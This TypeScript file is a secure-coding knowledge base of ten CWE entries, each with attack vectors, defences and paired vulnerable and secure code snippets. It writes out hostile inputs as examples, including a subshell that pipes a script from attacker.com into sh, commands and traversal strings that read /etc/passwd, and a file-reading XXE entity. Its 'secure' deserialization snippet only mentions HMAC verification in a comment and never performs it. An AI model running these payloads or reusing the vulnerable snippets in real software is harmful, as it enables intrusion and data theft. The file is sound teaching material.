export interface KnowledgeBaseEntry {
  id: string; // e.g. 'CWE-89'
  name: string;
  category: string;
  owaspCategory: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  summary: string;
  mechanics: string;
  attackVectors: string[];
  defensiveControls: string[];
  codeSample: {
    language: string;
    vulnerable: string;
    secure: string;
  };
  references: string[];
}

export const KNOWLEDGE_BASE_ENTRIES: KnowledgeBaseEntry[] = [
  {
    id: 'CWE-89',
    name: 'SQL Injection (SQLi)',
    category: 'Injection',
    owaspCategory: 'A03:2021-Injection',
    severity: 'critical',
    summary: 'Occurs when untrusted user input is directly concatenated into a SQL statement, allowing attackers to manipulate database query structure and execute arbitrary SQL commands.',
    mechanics: 'The SQL interpreter fails to distinguish between data literals and control commands. Metacharacters like single quotes, dashes (--), or boolean clauses (OR 1=1) bypass logic and dump data.',
    attackVectors: [
      'In-band SQLi (Error-based or UNION-based extraction)',
      'Blind SQLi (Boolean-based true/false response differences)',
      'Time-based Blind SQLi (SLEEP / pg_sleep / WAITFOR DELAY)',
      'Out-of-band SQLi (DNS / HTTP exfiltration via xp_dirtree, UTL_HTTP)',
    ],
    defensiveControls: [
      'Always utilize parameterized queries (Prepared Statements) with bind variables.',
      'Use modern Object-Relational Mappers (ORMs) while avoiding raw SQL interpolations.',
      'Apply database user least privilege: grant SELECT/INSERT only on required schemas, never db_owner/root.',
      'Validate and strictly whitelist dynamic table or column identifiers.',
    ],
    codeSample: {
      language: 'python',
      vulnerable: 'cursor.execute(f"SELECT * FROM users WHERE email = \'{user_email}\'")',
      secure: 'cursor.execute("SELECT * FROM users WHERE email = %s", (user_email,))',
    },
    references: [
      'https://cwe.mitre.org/data/definitions/89.html',
      'https://owasp.org/www-community/attacks/SQL_Injection',
      'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html',
    ],
  },
  {
    id: 'CWE-78',
    name: 'OS Command Injection',
    category: 'Injection',
    owaspCategory: 'A03:2021-Injection',
    severity: 'critical',
    summary: 'The application constructs system shell commands using unsanitized user-supplied input, allowing arbitrary command execution on the host operating system.',
    mechanics: 'Shell interpreters (sh, bash, cmd.exe) parse command separator tokens (; | & ` $()) within input strings, executing secondary malicious processes under application privileges.',
    attackVectors: [
      'Command separators: ; id, | whoami, && cat /etc/passwd',
      'Argument injection: passing flags like --output-file or -e to system binaries',
      'Backtick / subshell execution: `curl attacker.com/shell.sh | sh`',
    ],
    defensiveControls: [
      'Avoid invoking the system shell (e.g. avoid shell=True in Python or exec() in Node.js).',
      'Pass arguments as an immutable array/vector to process spawning APIs (e.g. execFile, subprocess.run([args])).',
      'Validate inputs with strict allowlist regex (e.g. ^[0-9a-fA-F-]{36}$ for UUIDs).',
    ],
    codeSample: {
      language: 'javascript',
      vulnerable: 'const { exec } = require("child_process");\nexec(`ping -c 1 ${userInput}`);',
      secure: 'const { execFile } = require("child_process");\nexecFile("ping", ["-c", "1", sanitizedHost]);',
    },
    references: [
      'https://cwe.mitre.org/data/definitions/78.html',
      'https://owasp.org/www-community/attacks/Command_Injection',
    ],
  },
  {
    id: 'CWE-918',
    name: 'Server-Side Request Forgery (SSRF)',
    category: 'Request Forgery',
    owaspCategory: 'A10:2021-Server-Side Request Forgery',
    severity: 'high',
    summary: 'The web application fetches remote resources based on user-supplied URLs without properly validating destination hosts, coercing the backend into dispatching requests to unintended destinations.',
    mechanics: 'The server acts as an unwitting proxy, exposing internal services, loopback interfaces (127.0.0.1, [::1]), cloud metadata endpoints (169.254.169.254), or Kubernetes APIs.',
    attackVectors: [
      'Cloud Instance Metadata Service (IMDS) theft (http://169.254.169.254/latest/meta-data/)',
      'Internal intranet port scanning and service probing (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)',
      'Protocol smuggling (gopher://, dict://, file://, ldap://)',
      'DNS Rebinding to bypass naive IP resolution checks',
    ],
    defensiveControls: [
      'Enforce an allowlist of permitted destination domains and protocols (https:// only).',
      'Perform DNS resolution at socket creation time and reject any private, loopback, or link-local IP addresses.',
      'Disable automatic HTTP redirect following in client libraries.',
      'Enforce IMDSv2 (Session Token required with hop-limit=1) on cloud workloads.',
    ],
    codeSample: {
      language: 'python',
      vulnerable: 'response = requests.get(request.args.get("avatar_url"))',
      secure: 'parsed = urllib.parse.urlparse(url)\nif parsed.hostname not in ALLOWED_DOMAINS:\n    raise SecurityException("Unauthorized host")\nresponse = requests.get(url, allow_redirects=False, timeout=3)',
    },
    references: [
      'https://cwe.mitre.org/data/definitions/918.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html',
    ],
  },
  {
    id: 'CWE-79',
    name: 'Cross-Site Scripting (XSS)',
    category: 'Injection',
    owaspCategory: 'A03:2021-Injection',
    severity: 'high',
    summary: 'Untrusted user input is included in dynamic web pages without proper validation or contextual encoding, allowing malicious JavaScript to execute in the victim browser.',
    mechanics: 'The browser cannot discern executable scripts from legitimate HTML. Injected scripts access sessionStorage, cookies without HttpOnly, or execute DOM actions impersonating the user.',
    attackVectors: [
      'Stored XSS (Persistent payloads stored in database/comments)',
      'Reflected XSS (Payload reflected immediately from URL query parameters)',
      'DOM-based XSS (Unsafe client-side sinks like innerHTML, eval, document.write)',
    ],
    defensiveControls: [
      'Context-aware output encoding (HTML body, attributes, JavaScript, CSS).',
      'Adopt modern declarative front-end frameworks (React, Angular) that auto-encode text nodes.',
      'Deploy strict Content Security Policy (CSP) headers without unsafe-inline.',
      'Set HttpOnly and SameSite=Strict flags on sensitive session cookies.',
    ],
    codeSample: {
      language: 'javascript',
      vulnerable: 'document.getElementById("greeting").innerHTML = `Hello ${userName}`;',
      secure: 'document.getElementById("greeting").textContent = `Hello ${userName}`;',
    },
    references: [
      'https://cwe.mitre.org/data/definitions/79.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
    ],
  },
  {
    id: 'CWE-639',
    name: 'Broken Object-Level Authorization (BOLA / IDOR)',
    category: 'Broken Access Control',
    owaspCategory: 'API1:2023-Broken Object Level Authorization',
    severity: 'critical',
    summary: 'The API or application exposes object identifiers (e.g. /api/users/123/invoices) in routes or parameters without verifying that the requesting user owns or is authorized to access the object.',
    mechanics: 'User A modifies the identifier in the request to target User B. The server authenticates User A correctly, but omits the authorization check verifying ownership before returning the record.',
    attackVectors: [
      'Parameter tampering in REST routes: GET /api/v1/invoices/9843 -> 9844',
      'GraphQL queries with arbitrary object IDs in queries',
      'Mass data scraping through sequential ID enumeration',
    ],
    defensiveControls: [
      'Implement object-level authorization checks at the data layer (e.g. WHERE id = ? AND tenant_id = current_user.tenant_id).',
      'Avoid relying solely on client-provided IDs; derive tenant context from validated session/JWT claims.',
      'Use cryptographically secure random identifiers (UUIDv4) to prevent sequential enumeration.',
    ],
    codeSample: {
      language: 'python',
      vulnerable: 'def get_invoice(invoice_id):\n    return Invoice.query.filter_by(id=invoice_id).first()',
      secure: 'def get_invoice(invoice_id, current_user):\n    return Invoice.query.filter_by(id=invoice_id, user_id=current_user.id).first_or_404()',
    },
    references: [
      'https://cwe.mitre.org/data/definitions/639.html',
      'https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/',
    ],
  },
  {
    id: 'CWE-502',
    name: 'Deserialization of Untrusted Data',
    category: 'Integrity Failures',
    owaspCategory: 'A08:2021-Software and Data Integrity Failures',
    severity: 'critical',
    summary: 'Application deserializes binary or formatted object streams from untrusted sources without verifying object signatures, enabling Remote Code Execution (RCE) via gadget chains.',
    mechanics: 'Native deserialization routines (Python pickle, Java ObjectInputStream, PHP unserialize) invoke magic methods (__reduce__, readObject, __wakeup) during instantiation, executing injected bytecode.',
    attackVectors: [
      'Python pickle.loads() gadget chains with os.system',
      'Java ysoserial gadget chains (CommonsCollections, Spring, Jackson)',
      'PHP POP (Property Oriented Programming) chains via unserialize()',
      'YAML deserialization via unsafe loaders (PyYAML yaml.load without SafeLoader)',
    ],
    defensiveControls: [
      'Avoid native language object serialization formats across network boundaries.',
      'Use safe, logic-free serialization formats like JSON, Protocol Buffers, or MessagePack.',
      'If serialization is mandatory, cryptographically sign payloads with HMAC-SHA256 and verify signatures before deserialization.',
    ],
    codeSample: {
      language: 'python',
      vulnerable: 'import pickle\ndata = pickle.loads(untrusted_user_cookie)',
      secure: 'import json, hmac, hashlib\n# Verify HMAC signature first, then parse strict JSON\ndata = json.loads(untrusted_user_cookie)',
    },
    references: [
      'https://cwe.mitre.org/data/definitions/502.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html',
    ],
  },
  {
    id: 'CWE-22',
    name: 'Improper Limitation of a Pathname (Path Traversal)',
    category: 'Input Validation',
    owaspCategory: 'A01:2021-Broken Access Control',
    severity: 'high',
    summary: 'The software uses external input to construct a file pathname without properly neutralizing sequence patterns like "../", allowing access to arbitrary files on the filesystem.',
    mechanics: 'Directory traversal sequences escape the designated webroot directory, accessing sensitive system files (/etc/shadow, C:\\Windows\\win.ini) or internal configuration files.',
    attackVectors: [
      'Basic dot-dot-slash: ../../../../etc/passwd',
      'URL encoded traversal: %2e%2e%2f or double-encoded %252e%252e%252f',
      'Null byte injection (legacy runtimes): filename.png%00.php',
    ],
    defensiveControls: [
      'Resolve the canonical path using safe platform APIs and verify it begins with the permitted base directory.',
      'Never allow user input to directly control file paths; use an indirect index mapping (e.g. file ID to database path).',
      'Strip path separators (basename(path)) if only filename selection is allowed.',
    ],
    codeSample: {
      language: 'javascript',
      vulnerable: 'const filePath = path.join("/var/www/uploads", req.query.filename);\nres.sendFile(filePath);',
      secure: 'const safePath = path.resolve("/var/www/uploads", path.basename(req.query.filename));\nif (!safePath.startsWith("/var/www/uploads/")) throw new Error("Path traversal blocked");\nres.sendFile(safePath);',
    },
    references: [
      'https://cwe.mitre.org/data/definitions/22.html',
      'https://owasp.org/www-community/attacks/Path_Traversal',
    ],
  },
  {
    id: 'CWE-611',
    name: 'XML External Entity (XXE) Injection',
    category: 'Injection',
    owaspCategory: 'A05:2021-Security Misconfiguration',
    severity: 'high',
    summary: 'The XML parser processes user-supplied XML documents containing external entity references, allowing attackers to view internal files, perform SSRF, or execute denial of service attacks.',
    mechanics: 'Document Type Definitions (DTDs) allow defining custom entities referencing system URIs (<!ENTITY xxe SYSTEM "file:///etc/passwd">). Weak parsers expand these entities during parsing.',
    attackVectors: [
      'Local file disclosure via file:// or php:// protocol',
      'SSRF against internal cloud metadata endpoints',
      'Billion Laughs XML entity expansion Denial of Service (DoS)',
    ],
    defensiveControls: [
      'Disable Document Type Definition (DTD) processing completely in the XML parser configuration.',
      'Disable external entity resolution (disallow-doctype-decl = true).',
      'Prefer less complex data serialization formats like JSON when possible.',
    ],
    codeSample: {
      language: 'python',
      vulnerable: 'import xml.etree.ElementTree as ET\ntree = ET.fromstring(untrusted_xml)',
      secure: 'from defusedxml.ElementTree import fromstring\n# defusedxml disables DTD expansion and entity bombs\ntree = fromstring(untrusted_xml)',
    },
    references: [
      'https://cwe.mitre.org/data/definitions/611.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html',
    ],
  },
  {
    id: 'CWE-287',
    name: 'Improper Authentication',
    category: 'Identification & Auth',
    owaspCategory: 'A07:2021-Identification and Authentication Failures',
    severity: 'critical',
    summary: 'When an actor claims to have a given identity, the software does not prove or insufficiently proves that the claim is correct.',
    mechanics: 'Flawed session handling, predictable session tokens, missing MFA, or accepting client-side claims without cryptographic verification allow unauthorized access.',
    attackVectors: [
      'JWT signature verification bypass (alg: none, HMAC key confusion with public RSA key)',
      'Credential stuffing / brute-force attacks lacking rate-limiting',
      'Session fixation and predictable token generators',
    ],
    defensiveControls: [
      'Implement multi-factor authentication (MFA / FIDO2 / WebAuthn).',
      'Enforce strong password policies with breach checks (HaveIBeenPwned).',
      'Strictly verify cryptographic signatures on JWTs and ensure algorithm cannot be overridden.',
      'Enforce progressive rate-limiting and account lockout protections.',
    ],
    codeSample: {
      language: 'javascript',
      vulnerable: 'const decoded = jwt.decode(token); // Decodes without signature verification!',
      secure: 'const verified = jwt.verify(token, process.env.JWT_PUBLIC_KEY, { algorithms: ["RS256"] });',
    },
    references: [
      'https://cwe.mitre.org/data/definitions/287.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html',
    ],
  },
  {
    id: 'CWE-798',
    name: 'Use of Hard-coded Credentials',
    category: 'Cryptography & Secrets',
    owaspCategory: 'A07:2021-Identification and Authentication Failures',
    severity: 'high',
    summary: 'The application contains hard-coded credentials such as API keys, database passwords, or cryptographic private keys directly embedded within source code or configuration files.',
    mechanics: 'Hard-coded secrets are visible to anyone with repository access, leak via decompiler outputs, or are exposed via public git history and client-side bundles.',
    attackVectors: [
      'Git repository history scraping for AWS/GCP/Stripe API keys',
      'Decompiling Android APKs or inspecting client JavaScript chunks',
      'Supply-chain credential harvesting from public package registries',
    ],
    defensiveControls: [
      'Store all secrets in a dedicated Secret Manager (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault).',
      'Inject configuration dynamically via secure environment variables.',
      'Deploy pre-commit hooks (git-secrets, TruffleHog, Gitleaks) to prevent accidental credential commits.',
    ],
    codeSample: {
      language: 'python',
      vulnerable: 'AWS_SECRET_KEY = "AKIAIOSFODNN7EXAMPLE"',
      secure: 'import os\nAWS_SECRET_KEY = os.environ.get("AWS_SECRET_KEY")',
    },
    references: [
      'https://cwe.mitre.org/data/definitions/798.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html',
    ],
  },
];
